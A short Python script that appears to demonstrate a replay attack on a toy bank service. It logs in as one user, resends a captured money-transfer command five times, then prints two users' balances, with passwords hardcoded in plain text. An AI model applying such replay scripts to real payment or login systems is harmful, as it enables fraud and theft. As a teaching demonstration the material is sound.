# attack_replay.py
import time
from bank_client import BankClient

CAPTURED = "TRANSFER 3 1000 stolen"

for i in range(5):
    c = BankClient()
    print(f"[{i}] LOGIN alice:", c.cmd("LOGIN alice qwerty"))
    print(f"[{i}] REPLAY:     ", c.cmd(CAPTURED))
    c.close()
    time.sleep(0.2)

c = BankClient()
print("\nResult: alice login:", c.cmd("LOGIN alice qwerty"))
print("alice balance:", c.cmd("BALANCE"))
print("bob balance:  ", c.cmd("LOGIN bob 12345") and c.cmd("BALANCE"))
c.close()
